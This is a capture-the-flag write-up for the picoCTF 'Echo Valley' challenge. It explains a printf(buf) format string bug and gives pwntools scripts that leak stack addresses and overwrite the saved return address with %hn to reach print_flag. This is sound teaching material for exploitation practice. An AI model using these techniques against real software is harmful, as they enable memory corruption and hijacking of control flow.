+++
title = "Echo Valley"
date = 2025-04-10
authors = ["rishit khandelwal"]
+++

# picoCTF

So when we first run `./valley`, we can observe that it asks us for some input as `Welcome to the Echo Valley, Try Shouting: \n`.

Looking into the code we can see that, `main()` simply calls `echo_valley`.
Looking into the code for `echo_valley` we see that its reads 100 bytes into a buffer of 100 bytes using `fgets`.
This essentially means that there is probably no buffer overflow in this case.

Looking down further we see:

```c
printf("You heard in the distance: ");
printf(buf);
```

This is obviously a format string vulnerability, and so we have arbitrary read/writes.
To win this challenge, we simply need to overwrite the stored rip on the stack such that when we enter "exit" we return to `print_flag` instead of `main`.

We can see by running `checksec` on the binary, that PIE is enabled so we cant just get the address of the function, but thats no problem, since we can just leak any other address from the stack which we know points to some known location, we can calculate the address of `print_flag`.
Going into `gdb`, we run the program and examine the stack to find the old rip on the stack.
If we leak the address using the format string vulnerability instead (lets just write a script to do that)

```py

from pwn import *

context.clear(arch = 'amd64')
p = process("./valley")

p.recv()
p.sendline(b"%p "*30)
print(p.recv().decode())
```

If we run this script a couple of times we notice that some the addresses seem to not change for the last few digits.
In my case the addresses which start with 0x7ffc--- seem to remain roughly the same in the last few digits.

```
0x7ffc292cc540 (nil) (nil) 0x561fa1a3670b 0x1 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa2070 (nil) 0xe227b993d1d31a00 0x7ffc292cc770 0x561f8ed4f413 0x7ffc292cc810 0x7f26175c9248 0x7ffc292cc7c0 0x7ffc292cc898 0x18ed4e040 0x561f8ed4f401 0x7ffc292cc898 0xf570526974ed44af 0x1
```

Doing this in gdb we can notice that the 21st seems to be the return address and the 20th one points to 8 bytes ahead of the return address.

So first we receive the address at the 20th position, then we subtract 8 to get the address at which we have to write the winning address.

We get the address at the 21st and then offset it by some value to get the address for `print_flag`.
By running `objdump -D valley` we can find the offsets of `main` and `print_flag`.
`main` is at 0x1401
`print_flag` is at 0x1269
but the address we get from the leak isnt exactly at `main`, so we go into gdb and find out the offset for from the address we got from the 21st address to main which turns out to be 0x1aa.

So we subtract 0x1aa from to get the address we want to overwrite.

So now we have both the value we want to overwrite and where we want to overwrite.
The way we can write is by using the `%n` format specifier.
Basically, `printf("AAAA%n", 0xdeadbeef);` will write 4 (from AAAA being printed being 4 bytes) to 0xdeadbeef.

Now you might wonder, we cant pass any arguments to `printf`, how do we write to any arbitrary address we want. Well we simply add the address as bytes into our payload. How does that help?
Well you might have noticed above that there are a lot of repeating x2070252070252070 in the above, what does that mean?
It means that our input is also accessible as arguments to `printf`! We can just point to the address we added as bytes into our input.

But we need to write an entire 64 bit address into at some address, and we dont really have that many bytes to spare (only a 100). So there are two solutions to this problem.

1. We use the padding feature for format specifier to make the string many times longer than it wouldve been otherwise.
2. Instead of overwriting the entire address and the gazzilions of bytes it would take, we just overwrite the last 2 bytes since only it remains the same (atleast the last 3 nibbles).

We can overwrite just the last 2 bytes by using `%hn` instead of using `%n` whose effect is essentially the same except that it writes just 2 bytes.

So our exploit script looks like:

```py
p.sendline(b"%20$p")
addr = p.recvuntil('\n')[29:-1].decode()
print(addr)
addr = int(addr, base=16)
addr -= 8
# now addr points to the old rip
p.sendline(b"%21$p")
win_addr = p.recvuntil('\n')[29:-1].decode()
win_addr = int(win_addr, base=16)
win_addr -= 0x1aa

win_addr_low = win_addr & 0xffff
# Since we only need to overwrite the last 2 bytes
```

Now the payload:

```py
payload = f"%{win_addr_low}x%8$hn".encode('utf-8')+p64(addr)
# Foreshadowing
p.sendline(payload)
p.sendline(b"exit")
print(p.recv())
```

But this obviously doesnt work! We dont know where the address actually is do we?
So we simply enter into gdb, and enter the payload, and try to figure out the argument the address aligns with.
By trial and error we see that by adding some spaces we can manage to have the address be exactly at the position of the 8th argument.

```py
x = len(str(win_addr_low)) # the length of the address in decimal
payload = f"%{win_addr_low-6}x{(9-x)*' '}".encode("utf-8")
payload += f"%8$hn".encode('utf-8')
payload += p64(addr)

p.sendline(payload)
p.sendline(b"exit")
print(p.recv())
```

The first change is that we subtract 6 from `win_addr_low`, as we are adding spaces to actually pad the address, we lessen the "apparent padding" to make sure the value remains the same.
Next depending upon the length of the decimal representation of `win_addr_low`, we may need to write 3 or 4 bytes so we add `9-x` spaces.

Now we simply need to run the full script and it should give us the flag!
But the script fails! Now why could that be, the logic seems flawless and there are no issues with the script either.
By strategically adding `print`s throughout the script i discovered this only seems to work if the 1st of the 4 nibbles im writing is 0 (i have no idea why).
By running the script a couple of times it worked once, and i knew it ran `print_flag`.

```txt
b'The Valley Disappears\nFailed to open flag file: No such file or directory\n'
[*] Process './valley' stopped with exit code 1 (pid 14436)
```
